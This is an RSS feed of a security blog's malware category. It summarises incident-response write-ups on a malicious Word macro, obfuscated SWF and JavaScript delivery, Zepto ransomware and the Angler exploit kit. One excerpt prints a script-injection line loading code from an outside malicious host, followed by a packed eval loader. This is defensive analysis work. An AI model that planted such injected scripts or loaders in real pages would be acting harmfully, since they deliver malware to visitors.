<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Malware on { bit.therapy }</title>
    <link>https://bittherapy.net/categories/malware/</link>
    <description>Recent content in Malware on { bit.therapy }</description>
    <generator>Hugo -- gohugo.io</generator>
    <copyright>{ bit.therapy }</copyright>
    <lastBuildDate>Fri, 25 Nov 2016 18:09:21 +0000</lastBuildDate>
    
	<atom:link href="https://bittherapy.net/categories/malware/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Malicious Document Analysis â€“ Macro to Shellcode</title>
      <link>https://bittherapy.net/post/malicious-document-analysis-macro-to-shellcode/</link>
      <pubDate>Fri, 25 Nov 2016 18:09:21 +0000</pubDate>
      
      <guid>https://bittherapy.net/post/malicious-document-analysis-macro-to-shellcode/</guid>
      <description>I came across an interesting Word document which at first glance definitely looked malicious. It had everything from random variable names to lyrics from Garbage - Run Baby Run in the comments. It also used an uncommon but very cool method for moving from macro to machine code execution.
Macro Breakdown The macro starts by creating pointers to DLL exports already loaded in memory by Word:
&#39;Run from the noise of the street and the loaded gun Public Declare Function whitworth Lib &amp;quot;kernel32.</description>
    </item>
    
    <item>
      <title>Analyzing Obfuscated SWFs</title>
      <link>https://bittherapy.net/post/analyzing-obfuscated-swfs/</link>
      <pubDate>Sun, 09 Oct 2016 13:18:17 +0000</pubDate>
      
      <guid>https://bittherapy.net/post/analyzing-obfuscated-swfs/</guid>
      <description>A few days ago I was alerted of a host communicating with a (bad) domain and downloading SWF files. There was some concern that there was malware beaconing out and I needed to figure out the extent of this infection, if any.
The host in question was seen contacting NovaSyncs.com which was serving malicious JS via mine.js:
document.write(unescape(&amp;quot;%3Cscript src=&#39;http://i.ejieban.com/clouder.js&#39; defer=&#39;defer&#39; type=&#39;text/javascript&#39;%3E%3C/script%3E&amp;quot;));  Digging deeper:
eval(function(p,a,c,k,e,r){e=function(c){return(c&amp;lt;a?&#39;&#39;:e(parseInt(c/a)))+((c=c%a)&amp;gt;35?String.fromCharCode(c+29):c.toString(36))};if(!&#39;&#39;.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return&#39;\\w+&#39;};c=1};while(c--)if(k[c])p=p.replace(new RegExp(&#39;\\b&#39;+e(c)+&#39;\\b&#39;,&#39;g&#39;),k[c]);return p}(&#39;a(&amp;quot;V&amp;quot;==1B(3)){3=[];3.g=[];3.K=9(h){4 6=5.16(&amp;quot;1u&amp;quot;);6.w.o=&amp;quot;0&amp;quot;;6.w.j=&amp;quot;0&amp;quot;;6.w.1G=&amp;quot;1M&amp;quot;;6.w.29=&amp;quot;-2d&amp;quot;;6.1p=h;1j 6};3.C=9(v,8){4 6=3.</description>
    </item>
    
    <item>
      <title>A Look at Zepto Ransomware - Payload Delivery Analysis</title>
      <link>https://bittherapy.net/post/a-look-at-zepto-ransomware-payload-delivery-analysis/</link>
      <pubDate>Tue, 16 Aug 2016 12:36:51 +0000</pubDate>
      
      <guid>https://bittherapy.net/post/a-look-at-zepto-ransomware-payload-delivery-analysis/</guid>
      <description>It&amp;rsquo;s another quiet Friday when we are alerted of bunch of files with the .zepto extension being created all over the place. It seems that a Zepto sample that worked its way through our network. AV was mostly useless and the ransomware managed to encrypt a few thousand files on a particular share.
First thing&amp;rsquo;s first, I need to find all the users actively encrypting files on this share.</description>
    </item>
    
    <item>
      <title>Walking Through Angler Exploit Kit - Payload Delivery Analysis</title>
      <link>https://bittherapy.net/post/walking-through-angler-exploit-kit-payload-delivery-analysis/</link>
      <pubDate>Mon, 18 Apr 2016 14:28:00 +0000</pubDate>
      
      <guid>https://bittherapy.net/post/walking-through-angler-exploit-kit-payload-delivery-analysis/</guid>
      <description>A few days ago I was alerted of a potentially compromised website serving Angler EK: hxxp://www.stadiumseatingcharts.com/rogers-centre/
The Angler exploit kit will redirect the client to a separate compromised server in order to deliver the exploit and the malware stage. Usually, it accomplishes this using an iframe or an anchor (and calling the click()method for that element), or something similar. The point is, there is some bad JavaScript code leading to some other bad JavaScript code, and it&amp;rsquo;s usually obfuscated.</description>
    </item>
    
  </channel>
</rss>